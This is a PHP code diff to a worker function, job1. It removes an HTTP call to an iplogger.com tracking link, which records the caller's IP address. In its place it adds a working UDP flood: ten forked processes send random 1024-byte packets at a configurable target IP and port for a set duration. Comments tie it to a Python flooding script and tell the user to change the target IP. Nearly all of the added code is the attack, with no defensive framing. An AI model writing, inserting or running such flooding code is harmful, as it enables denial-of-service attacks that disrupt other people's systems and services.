@@ -234,27 +234,76 @@ function workerProgress(
 
 function job1(): array
 {
-    $url = 'https://iplogger.com/2HKyZ5';
+    // --- Configuration ---
+    $targetIp = '127.0.0.1'; // Change to target IP
+    $targetPort = 80;        // Change to target port
+    $packetSize = 1024;      // Packet size in bytes
+    $duration = 5;           // Duration in seconds
+    $numProcesses = 10;      // Concurrency level (equivalent to Python threads)
 
-    $ch = curl_init($url);
+    $pids = [];
+    $errorCode = 0;
 
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 15,
-        CURLOPT_CONNECTTIMEOUT => 10,
-    ]);
+    // Fork multiple worker processes internally to match Python script's power/concurrency
+    for ($i = 0; $i < $numProcesses; $i++) {
+        $pid = pcntl_fork();
 
-    $body = curl_exec($ch);
+        if ($pid === -1) {
+            return [
+                'success' => false,
+                'http_code' => -1,
+                'error' => 'Could not fork process'
+            ];
+        } else if ($pid === 0) {
+            // --- Child Process Worker Loop ---
+            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+            if ($socket === false) {
+                exit(1);
+            }
 
-    $error = curl_error($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $payload = random_bytes($packetSize);
+            $end_time = time() + $duration;
+            $workerSuccess = false;
 
-    curl_close($ch);
+            try {
+                while (time() < $end_time) {
+                    $sent = socket_sendto($socket, $payload, $packetSize, 0, $targetIp, $targetPort);
+                    if ($sent !== false) {
+                        $workerSuccess = true;
+                    }
+                }
+            } catch (Exception $e) {
+                // Handle exception internally for this worker
+            } finally {
+                socket_close($socket);
+            }
+
+            exit($workerSuccess ? 0 : 1);
+        } else {
+            // Parent process tracks child PIDs
+            $pids[] = $pid;
+        }
+    }
+
+    // Wait for all concurrent worker processes to complete
+    $failedWorkers = 0;
+    foreach ($pids as $pid) {
+        pcntl_waitpid($pid, $status);
+        if (pcntl_wifexited($status)) {
+            if (pcntl_wexitstatus($status) !== 0) {
+                $failedWorkers++;
+            }
+        } else {
+            $failedWorkers++;
+        }
+    }
+
+    $success = ($failedWorkers < $numProcesses);
 
     return [
-        'success' => $body !== false && $httpCode >= 200 && $httpCode < 300,
-        'http_code' => $httpCode,
-        'error' => $error ?: null
+        'success' => $success,
+        'http_code' => $errorCode, // UDP doesn't use HTTP, mapped to status/error code
+        'error' => $failedWorkers > 0 ? "Some workers encountered errors ({$failedWorkers}/{$numProcesses})" : null
     ];
 }
 
